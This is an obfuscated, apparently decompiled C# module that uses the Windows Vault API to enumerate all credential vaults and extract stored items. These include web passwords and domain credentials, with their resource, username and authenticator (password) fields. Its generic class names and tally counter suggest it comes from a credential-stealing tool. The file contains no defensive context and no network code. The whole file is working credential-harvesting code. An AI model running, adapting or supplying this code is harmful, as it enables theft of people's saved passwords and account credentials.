using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using ns13;

namespace ns9;

internal sealed class Class33
{
	public static List<GStruct10> smethod_0()
	{
		List<GStruct10> list = new List<GStruct10>();
		Version version = Environment.OSVersion.Version;
		int major = version.Major;
		int minor = version.Minor;
		Type type = ((major < 6 || minor < 2) ? typeof(GClass13.GStruct4) : typeof(GClass13.GStruct3));
		int int_ = 0;
		IntPtr intptr_ = IntPtr.Zero;
		int num = GClass13.VaultEnumerateVaults(0, ref int_, ref intptr_);
		if (num != 0)
		{
			throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + num + ")");
		}
		IntPtr ptr = intptr_;
		Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
		dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
		dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
		dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
		dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
		dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
		dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
		dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
		dictionary.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
		dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
		for (int i = 0; i < int_; i++)
		{
			object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
			Guid guid_ = new Guid(obj.ToString());
			ptr = (IntPtr)(ptr.ToInt64() + Marshal.SizeOf(typeof(Guid)));
			IntPtr intptr_2 = IntPtr.Zero;
			string text = ((!dictionary.ContainsKey(guid_)) ? guid_.ToString() : dictionary[guid_]);
			num = GClass13.VaultOpenVault(ref guid_, 0u, ref intptr_2);
			if (num != 0)
			{
				Console.WriteLine("Unable to open the following vault: " + text + ". Error: 0x" + num);
				continue;
			}
			int int_2 = 0;
			IntPtr intptr_3 = IntPtr.Zero;
			num = GClass13.VaultEnumerateItems(intptr_2, 512, ref int_2, ref intptr_3);
			if (num != 0)
			{
				Console.WriteLine("[ERROR] Unable to enumerate vault items from the following vault: " + text + ". Error 0x" + num);
				continue;
			}
			IntPtr ptr2 = intptr_3;
			if (int_2 <= 0)
			{
				continue;
			}
			for (int j = 1; j <= int_2; j++)
			{
				object obj2 = Marshal.PtrToStructure(ptr2, type);
				ptr2 = (IntPtr)(ptr2.ToInt64() + Marshal.SizeOf(type));
				IntPtr intptr_4 = IntPtr.Zero;
				FieldInfo field = obj2.GetType().GetField("SchemaId");
				Guid guid_2 = new Guid(field.GetValue(obj2)!.ToString());
				IntPtr intPtr = (IntPtr)obj2.GetType().GetField("pResourceElement")!.GetValue(obj2);
				IntPtr intPtr2 = (IntPtr)obj2.GetType().GetField("pIdentityElement")!.GetValue(obj2);
				IntPtr zero = IntPtr.Zero;
				if (major >= 6 && minor >= 2)
				{
					try
					{
						zero = (IntPtr)obj2.GetType().GetField("pPackageSid")!.GetValue(obj2);
						num = GClass13.VaultGetItem(intptr_2, ref guid_2, intPtr, intPtr2, zero, IntPtr.Zero, 0, ref intptr_4);
					}
					catch
					{
					}
				}
				else
				{
					num = GClass13.VaultGetItem_1(intptr_2, ref guid_2, intPtr, intPtr2, IntPtr.Zero, 0, ref intptr_4);
				}
				if (num != 0)
				{
					Console.WriteLine("Error occured while retrieving vault item. Error: 0x" + num);
					continue;
				}
				object obj4 = Marshal.PtrToStructure(intptr_4, type);
				IntPtr intptr_5 = (IntPtr)obj4.GetType().GetField("pAuthenticatorElement")!.GetValue(obj4);
				GStruct10 item = default(GStruct10);
				object obj5 = smethod_1(intPtr);
				if (obj5 != null)
				{
					item.String_0 = obj5.ToString();
				}
				object obj6 = smethod_1(intPtr2);
				if (obj6 != null)
				{
					item.String_1 = obj6.ToString();
				}
				object obj7 = smethod_1(intptr_5);
				if (obj7 != null)
				{
					item.String_2 = obj7.ToString();
				}
				Class55.int_0++;
				list.Add(item);
			}
		}
		return list;
	}

	[CompilerGenerated]
	internal static object smethod_1(IntPtr intptr_0)
	{
		object obj = Marshal.PtrToStructure(intptr_0, typeof(GClass13.GStruct5));
		object? value = obj.GetType().GetField("Type")!.GetValue(obj);
		IntPtr ptr = (IntPtr)(intptr_0.ToInt64() + 16L);
		switch ((int)value)
		{
		case 0:
		{
			object obj2 = Marshal.ReadByte(ptr);
			return (bool)obj2;
		}
		case 1:
			return Marshal.ReadInt16(ptr);
		case 2:
			return Marshal.ReadInt16(ptr);
		case 3:
			return Marshal.ReadInt32(ptr);
		case 4:
			return Marshal.ReadInt32(ptr);
		case 5:
			return Marshal.PtrToStructure(ptr, typeof(double));
		case 6:
			return Marshal.PtrToStructure(ptr, typeof(Guid));
		case 7:
			return Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
		default:
			return null;
		case 12:
			return new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
		}
	}
}
